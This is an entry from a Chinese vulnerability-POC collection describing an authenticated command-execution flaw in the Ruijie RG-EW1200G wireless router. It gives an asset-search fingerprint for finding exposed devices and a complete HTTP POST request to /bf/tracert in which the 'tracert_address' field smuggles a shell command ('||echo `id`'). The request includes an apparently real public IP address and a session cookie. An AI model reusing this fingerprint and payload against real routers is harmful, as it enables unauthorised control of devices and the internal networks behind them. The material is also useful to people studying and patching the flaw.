---
source: "wy876 漏洞文库"
---

# 锐捷RG-EW1200G路由器后台命令执行

# <font style="color:rgba(0, 0, 0, 0.9);">一、漏洞简介</font>
<font style="color:rgba(0, 0, 0, 0.9);">锐捷网络RG-EW1200G 存在后台命令执行漏洞，登录路由器后，可执行任意命令，控制内部网络</font>

# 二、影响版本
+ <font style="color:rgba(0, 0, 0, 0.9);">RG-EW1200G无线路由器</font>

# 三、资产测绘
```plain
body="/static/js/app.09df2a9e44ab48766f5f.js"
```


+ 登录页面


# 四、漏洞复现
```plain
POST /bf/tracert HTTP/1.1
Host: 
Content-Length: 53
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://175.167.44.37:6060
Referer: http://175.167.44.37:6060/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: bcrsession=f1d7956e195d123d8f0b4a6670553a7cda05348636f998dddeff1d3f3fe1fc8d87ed86b4b4818536
Connection: close

{"tracert_address":"||echo `id`","is_first_req":true}
```

![]()


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vmp57vmo35od9v3c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
